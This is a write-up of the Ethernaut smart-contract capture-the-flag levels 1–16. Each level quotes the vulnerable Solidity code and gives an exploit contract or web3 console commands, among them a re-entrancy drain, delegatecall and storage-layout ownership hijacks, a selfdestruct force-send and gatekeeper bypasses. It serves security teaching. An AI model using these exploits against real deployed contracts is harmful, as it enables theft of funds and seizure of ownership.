# Ethernaut CTF

# 1. [Challenge 1 : Fallback](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

Tasks: \
    1. you claim ownership of the contract \
    2. you reduce its balance to 0

**Solution:** \
Vulnerable Code: 
```
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
It's fallback function and here 2 requirements required to make ourself owner

- First we need to contribute some ether to satisfy ```contributions[msg.sender] > 0``` requirements 
- To satisfy 2nd requirements we need send some ether in this fallback function. As fallback function execute when the requested function isn't available. So we can execute ```contract.sendTransaction({"value": 1})``` this to satisfy 2nd requirements and make ourself owner

- To reduce contract balance to 0 we can simply call ```withdraw``` function and able to solve the 1st challenge.


# 2. [Challenge 2: Fallout](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

Tasks: 
- Claim ownership of the contract below to complete this level.

**Solution:** \
Vulnerable Code: 
```
  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

This constructor function name has a typo. So, to achieve ownership we just need to call ```Fal1out``` function and able to the 2nd challenge


# 3. [Challenge 3: Coin Flip](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

Tasks: 
- This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

**Solution:** \
Vulnerable Code: 
```
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
```

Attack Payload:
```
contract Attack {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function attack(CoinFlip coinFlip) public {

    uint256 guess1 = uint256(blockhash(block.number - 1));
    uint256 guess = uint256(guess1/FACTOR);
    bool _guess = guess == 1 ? true : false;
    coinFlip.flip(_guess);

    }
}
```
We can win this unlimite time by just mimicing the checker functions of `flip` function

# 4. [Challenge 4: Telephone](https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768)

Tasks: 
- Claim ownership of the contract below to complete this level.

**Solution:** \
Vulnerable Code:
```
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
```

Attack Payload:
```
contract Attack {
    function attack(Telephone telephone) public {
        telephone.changeOwner(tx.origin);
    }
}
```
This `changeOwner` function is basically checking if `tx.origin` not equally `msg.sender` it will set user inputed address as owner. So we can do is create a smart contract that will call the `changeOwner` function we can satisfy the check and make ourself as owner.


# 5. [Challenge 5: Token](https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE)

Tasks: 
- The goal of this level is for us to hack the basic token contract below. We are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

**Solution:** \
Vulnerable Code:
```
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
```
The `transfer` function is taking address whom we want to send token and `value` how much we want send but in 3rd line we can execute `Arithmetic Overflow and Underflow` by submiting 21 (As we have 20 TOKEN) So it will underflow the arithmetic function and add (2^256 - 1) this much token in our wallet



# 6. [Challenge 6: Delegation](https://ethernaut.openzeppelin.com/level/0x9451961b7Aea1Df57bc20CC68D72f662241b5493)

Tasks: 
- The goal of this level is for you to claim ownership of the instance you are given.

**Solution:** \
Vulnerable Code:
```
  function pwn() public {
    owner = msg.sender;
  }
```
```
  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
```

Attack Payload:
```
contract Attack {
    address public delegation;

    constructor(address _delegation) public {
        delegation = _delegation;
    }

    function attack() public {
        delegation.call(abi.encodeWithSignature("pwn()"));
    }
}
```
To solve in command line:
```
var functionSignature = web3.utils.sha3("pwn()")
contract.sendTransaction({data: functionSignature})
```

Eve called Attack.attack().
Attack called the `fallback` function of `Delegation` sending the function selector of `pwn()`. `Delegation` forwards the call to `Delegate` using delegatecall.
Here `msg.data` contains the function selector of `pwn()`.
This tells Solidity to call the function `pwn()` inside `Delegate`.
The function `pwn()` updates the owner to `msg.sender`.
Delegatecall runs the code of `Delegate` using the context of `Delegation`.
Therefore `Delegation`'s storage was updated to `msg.sender` where `msg.sender` is the caller of `Delegation`, in this case Attack.


# 7. [Challenge 7: Force](https://ethernaut.openzeppelin.com/level/0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea)

Tasks:
- Some contracts will simply not take your money ¯\_(ツ)_/¯
- The goal of this level is to make the balance of the contract greater than zero.

**Solution:** \
Vulnerable Code:
Attack Payload:
```
contract Attack {
    Force force;

    constructor(Force _force) public {
        force = Force(_force);
    }

    function attack() public payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}
```
To solve the challenge we can simply use `selfdestruct` in our contract and than it will send all the ether to our desire address.


# 8. [Challenge 8: Vault](https://ethernaut.openzeppelin.com/level/0xf94b476063B6379A3c8b6C836efB8B3e10eDe188)

Tasks:
- Unlock the vault to pass the level!

**Solution:** \
Vulnerable Code:
```
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }
```

To solve in command line:
```
await web3.eth.getStorageAt(contract.address, 1)
web3.utils.toAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```

It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter. 



# 9. [Challenge 9: King](https://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5)

Tasks:
- The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

- Such a fun game. Your goal is to break it.
- When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

**Solution:** \
Vulnerable Code:
```
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
```

Attack Payload:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.17;

contract Solution {
    constructor() public payable {
        // this address is the address of your level instance contract
        address payable contractAddr = 0xDFE781807B2668D44BaB804e8cb5c4D685Ab2eff;
        address(contractAddr).call.value(msg.value)("");
    }
    
    function() external payable {
        revert("lmao sucks");
    }
}
```

In the 3rd line of vulnerable function it's sending the ether to the previous king and than set highest ether sender user as king. In our attack contract when the vulnerable contract will try to send ether for setting new king. Our contract will revert that and other user will never be able to become king




# 10. [Challenge 10: Re-entrancy](https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D)

Tasks:
- The goal of this level is for you to steal all the funds from the contract.

**Solution:** \
Vulnerable Code:
```
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
```

Attack Payload:
```
pragma solidity ^0.6.10;

import './Reentrance.sol';

contract EthernautReentrancyAttack {
    Reentrance target; 
    
    constructor(address payable _targetAddr) public payable {
        target = Reentrance(_targetAddr);
    }
    
    function donateToTarget() public {
        target.donate.value(1000000000000000).gas(4000000)(address(this)); //need to add value to this fn
    }
    
    fallback() external payable {
        if (address(target).balance != 0 ) {
            target.withdraw(1000000000000000); 
        }
    }

    function withdrawblanace() payable public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```
This contract is vulnerable to re-entracy attack as it's updating user balance after external contract call. So malicious can create a loop on withdraw function from 1st line to 3rd line and it will withdraw all the ether available on the contract.


# 11. [Challenge 11: Elevator](https://ethernaut.openzeppelin.com/level/0xaB4F3F2644060b2D960b0d88F0a42d1D27484687)


Tasks:
- This elevator won't let you reach the top of your building. Right?

**Solution:** \
Vulnerable Code:
```
  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
```

Attack Payload:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Elevator.sol';

contract ElevatorAttack {
    Elevator public elevator;
    bool result = true;

    constructor(address _elevator) public {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint) external returns(bool) {
        if(result == true) {
            result = false; 
        } else {
            result = true; 
        }
        return result;
    }

    function callGoTo() public {
        elevator.goTo(13);
    }
}
```
we created our own implementation of the `isLastFloor()` method because the building references an instance of `Building(msg.sender)`, our `ElevatorAttack` contract can be that reference, meaning our own `isLastFloor()` method can be used to return whatever we want our method returned false and then true in order to fulfull this level's requirements





# 12. [Challenge 12: Privacy](https://ethernaut.openzeppelin.com/level/0x11343d543778213221516D004ED82C45C3c8788B)

Tasks:
- The creator of this contract was careful enough to protect the sensitive areas of its storage. Unlock this contract to beat the level.

Helpful Resources: 
- [Walkthrough](https://www.goodbytes.be/blog/article/ethernaut-walkthrough-level-12-privacy)
- [Storage In Solidity](https://docs.soliditylang.org/en/v0.8.10/internals/layout_in_storage.html)
- [Read Ethereum Contract Storage](https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925)

**Solution:** \
Vulnerable Code:
```
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
```

Command to get the private data: 
```
await web3.eth.getStorageAt(contract.address, 5)
```

Attack Payload:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Privacy.sol';

contract PrivacyAttack {
    Privacy public privacy;

    constructor(address _privacy) public { 
        privacy = Privacy(_privacy);
    }

    function callUnlock(bytes32 _slotvalue) public {
        bytes16 key = bytes16(_slotvalue);
        privacy.unlock(key);
    }
}
```
Again, we are confronted with the fact that you can't keep any data private when it's stored on the public blockchain (unless of course, you encrypt it) once we understand storage slots, we can more easily grab any value from any contract that we want.



# 13. [Challenge 13: Gatekeeper One](https://ethernaut.openzeppelin.com/level/0x9b261b23cE149422DE75907C6ac0C30cEc4e652A)

Tasks:
- Make it past the gatekeeper and register as an entrant to pass this level.

Helpful Resources:
- [Solution Video](https://www.youtube.com/watch?v=TH3ZeWcISmY)
- [Gatekeeper One Solution](https://cyanwingsbird.blog/solidity/ethernaut/13-gatekeeper-one/)

**Solution:** \
Attack Payload:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract AreYouTheKeymaster{
    using SafeMath for uint256;
    bytes8 txOrigin16 = 0x25E73b3f79C43564; //0x3FcB875f56beddC4; //last 16 digits of your account
    bytes8 public key = txOrigin16 & 0xFFFFFFFF0000FFFF; 
    GatekeeperOne public gkpOne;

 
    constructor(address _addr) public{
        gkpOne = GatekeeperOne(_addr);
    }

    function letMeIn() public{
         for (uint256 i = 0; i < 120; i++) {
         (bool result, bytes memory data) = address(gkpOne).call{gas:
          i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key)); // thanks to Spalladino https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol
      if(result)
        {
        break;
      }
    }
  }
        
    
}
```



# 14. [Challenge 14: Gatekeeper Two](https://ethernaut.openzeppelin.com/level/0xdCeA38B2ce1768E1F409B6C65344E81F16bEc38d)

Tasks:
- This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

Helpful Resources:
- [Gatekeeper Two Solution](https://cyanwingsbird.blog/solidity/ethernaut/14-gatekeeper-two/)

**Solution:** \
Attack Payload:
```
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwo {
    address levelInstance;
    
    constructor(address _levelInstance) {
      levelInstance = _levelInstance;
      unchecked{
          bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0) - 1  );
          IGatekeeperTwo(levelInstance).enter(key);
      }
    }
}
```

`^` is `Bitwise XOR` , so `a^b=c`, then `a^c=b`. Also, since `Solidity 0.8` , operations come with built-in underflow and overflow checks. Therefore, it is necessary to include the operation part with `unchecked {}`, otherwise the above operation will cause the transaction to fail. 



# 15. [Challenge 15: Naught Coin](https://ethernaut.openzeppelin.com/level/0x096bb5e93a204BfD701502EB6EF266a950217218)

Tasks:
- NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

**Solution:** \
Payload for CMD line:
```
await contract.approve(player, "1000000000000000000000000")
await contract.transferFrom(player, "0x5206e78b21Ce315ce284FB24cf05e0585A93B1d9", "1000000000000000000000000")

To check allowed token to transfer: (await contract.allowance(player, player)).toString()
```

ERC20 has 3 optional function and 6 mandatory function. In the CTF contract only `transfer` function has `lockTokens ` modifier but we can use `approve` function approve other user to spend the tokens for this challenge we approve ourselves for spender and then we can use `transferFrom` function to send all token to any address to solve the challenge.


# 16. [Challenge 16: Preservation](https://ethernaut.openzeppelin.com/level/0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F)

Tasks:
- The goal of this level is for you to claim ownership of the instance you are given.

**Solution:** \
Attack Payload:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Attack {
    // Make sure the storage layout is the same as Preservation
    // This will allow us to correctly update the state variables
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    Preservation public hackMe;

    constructor(Preservation _hackMe) public {
        hackMe = Preservation(_hackMe);
    }

    function attack() public {
        // this will execute setTime function Preservation contract. 
        // Then HackeMe contract delegatecall the LibraryContract contract and 
        // it will change Preservation contract's timeZone1Library state variable to our address
        hackMe.setFirstTime(uint(uint160(address(this))));
        // pass any number as input, the function setTime() below will
        // be called and it will execute Attacker contract setTime function and 
        // change the Preservation contract's owner address to Attacker contract's address
        hackMe.setFirstTime(1);
    }

    // function signature must match HackMe.doSomething()
    function setTime(uint _num) public {
        owner = msg.sender;
    }
}
```

Inside `attack()`, the first call to `setTime()` changes the address of `LibraryContract` store in `Preservation`. Address of `LibraryContract` is now set to Attack. The second call to `setTime()` calls `Attack.setTime()` and here we change the owner.

